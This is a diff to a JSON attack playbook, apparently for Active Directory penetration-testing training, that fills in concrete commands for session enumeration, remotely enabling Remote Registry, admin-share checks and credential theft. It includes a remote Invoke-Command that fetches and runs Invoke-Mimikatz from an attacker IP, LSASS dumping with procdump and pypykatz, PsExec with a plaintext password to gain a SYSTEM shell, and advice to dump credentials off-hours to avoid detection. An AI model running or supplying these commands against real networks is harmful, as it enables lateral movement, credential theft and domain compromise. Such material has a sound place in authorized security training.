@@ -82,7 +82,7 @@
             "test-admin-share-access",
             "ps-get-process-owner"
           ],
-          "expected_outcome": "Get-NetSession shows sqlservice has sessions on FILESERVER01, FILESERVER02, DATABASE03. Test admin access: dir \\\\FILESERVER01\\C$ - success! You have local admin. Use PsExec: psexec.py corp/sqlservice:Password123@FILESERVER01 cmd. You get SYSTEM shell on FILESERVER01. Check logged-on users: query user reveals CORP\\DA-BACKUP logged in. Dump LSASS, extract DA-BACKUP credentials. You've chained from service account → lateral movement → privileged account compromise.",
+          "expected_outcome": "Get-NetSession shows sqlservice has sessions on FILESERVER01, FILESERVER02, DATABASE03. Test admin access: dir \\\\FILESERVER01\\C$ - success! You have local admin. Use PsExec: psexec.py corp/sqlservice:Password123@FILESERVER01 cmd. You get SYSTEM shell on FILESERVER01. Check logged-on users: query user reveals CORP\\DA-BACKUP logged in. Dump LSASS, extract DA-BACKUP credentials. You've chained from service account \u2192 lateral movement \u2192 privileged account compromise.",
           "why_this_works": "Service accounts are designed to run services/tasks across multiple systems. Where these accounts have active sessions = where they're actually used = where they likely have elevated privileges. By correlating session data with admin access testing, you identify systems where the service account gives you foothold. This is intelligent targeting vs brute-force PSExec attempts against random systems. Sessions indicate legitimate use - you're following the same paths administrators configured."
         }
       ],
@@ -91,44 +91,100 @@
           "title": "Phase 1: Operating System Enumeration",
           "notes": "Identify target OS versions to understand which session enumeration methods will work. Windows Server 2019+, Windows 10 1709+, and Windows 11 restrict NetSessionEnum to admins. Target older systems for unauthenticated session enumeration.",
           "commands": [
-            "powerview-get-netcomputer-os",
-            "powerview-get-netcomputer-os-filter"
+            {
+              "id": "powerview-get-netcomputer-os",
+              "example": "Get-NetComputer -FullData | Select-Object dnshostname, operatingsystem, operatingsystemversion",
+              "shows": "dnshostname: Fully qualified domain name"
+            },
+            {
+              "id": "powerview-get-netcomputer-os-filter",
+              "example": "Get-NetComputer -FullData | Where-Object {($_.operatingsystem -like '*Server 2012*') -or ($_.operatingsystem -like '*Server 2016*') -or (($_.operatingsystem -like '*Windows 10*') -and ([int]($_.operatingsystemversion -split '\\.')[2] -lt 16299))}",
+              "shows": "List of legacy systems only"
+            }
           ]
         },
         {
           "title": "Phase 2: NetSessionEnum-Based Session Discovery (Legacy Systems)",
           "notes": "Use NetSessionEnum API via Get-NetSession (PowerView) to enumerate active SMB sessions. Works on Windows Server 2016 and earlier, Windows 10 pre-1709. Returns users who have active file share connections or mapped drives. Focus on privileged accounts (Domain Admins, service accounts).",
           "commands": [
-            "powerview-get-netsession",
-            "check-netsessionenum-registry"
+            {
+              "id": "powerview-get-netsession",
+              "example": "Get-NetSession -ComputerName DC1.corp.com",
+              "shows": "CName"
+            },
+            {
+              "id": "check-netsessionenum-registry",
+              "example": "Get-Acl 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\DefaultSecurity' | Format-List",
+              "shows": "Access control list displayed"
+            }
           ]
         },
         {
           "title": "Phase 3: Remote Registry Session Discovery (Modern Systems)",
           "notes": "When NetSessionEnum fails (modern OS), use Remote Registry method via PsLoggedOn or Get-NetLoggedon. Requires local admin access OR Remote Registry service enabled. Queries HKEY_USERS hive to identify loaded user profiles (active sessions). More reliable than NetSessionEnum on modern Windows.",
           "commands": [
-            "sysinternals-psloggedon",
-            "powerview-get-netloggedon",
-            "check-remote-registry-service",
-            "enable-remote-registry",
-            "query-hkey-users-remote"
+            {
+              "id": "sysinternals-psloggedon",
+              "example": ".\\PsLoggedon.exe \\\\FILES04.corp.com",
+              "shows": "Users logged on locally"
+            },
+            {
+              "id": "powerview-get-netloggedon",
+              "example": "Get-NetLoggedon -ComputerName WEB04.corp.com",
+              "shows": "UserName"
+            },
+            {
+              "id": "check-remote-registry-service",
+              "example": "Get-Service -ComputerName WS01.corp.com -Name RemoteRegistry",
+              "shows": "Status: Running - service active, can use Remote Registry..."
+            },
+            {
+              "id": "enable-remote-registry",
+              "example": "sc.exe \\\\WORKSTATION05.corp.com config RemoteRegistry start= auto && sc.exe \\\\WORKSTATION05.corp.com start RemoteRegistry",
+              "shows": "[SC] ChangeServiceConfig SUCCESS"
+            },
+            {
+              "id": "query-hkey-users-remote",
+              "example": "reg query \\\\FILESERVER01\\HKU",
+              "shows": "List of SIDs displayed (S-1-5-21-... format)"
+            }
           ]
         },
         {
           "title": "Phase 4: Admin Access Validation",
           "notes": "Verify local admin access on targets where privileged sessions were discovered. Test C$ share access or use Find-LocalAdminAccess. Systems where you have admin + privileged user session = credential theft opportunity.",
           "commands": [
-            "powerview-find-localadminaccess",
-            "test-admin-share-access"
+            {
+              "id": "powerview-find-localadminaccess",
+              "example": "Find-LocalAdminAccess",
+              "shows": "Computer names where you have admin access"
+            },
+            {
+              "id": "test-admin-share-access",
+              "example": "Test-Path \\\\FILESERVER01.corp.com\\C$",
+              "shows": "True (returned) - you have local admin access"
+            }
           ]
         },
         {
           "title": "Phase 5: Credential Theft Preparation",
           "notes": "Once target system identified (admin access + privileged session), prepare credential dumping. Use Mimikatz, procdump + pypykatz, or direct LSASS access. Don't rush - maintain operational security. Dump credentials during off-hours to avoid detection.",
           "commands": [
-            "invoke-mimikatz-remote",
-            "procdump-lsass",
-            "pypykatz-parse"
+            {
+              "id": "invoke-mimikatz-remote",
+              "example": "Invoke-Command -ComputerName WORKSTATION05.corp.com -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"' }",
+              "shows": "Hostname:"
+            },
+            {
+              "id": "procdump-lsass",
+              "example": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+              "shows": "Dump 1 initiated"
+            },
+            {
+              "id": "pypykatz-parse",
+              "example": "pypykatz lsa minidump lsass.dmp",
+              "shows": "== LogonSession =="
+            }
           ]
         }
       ],
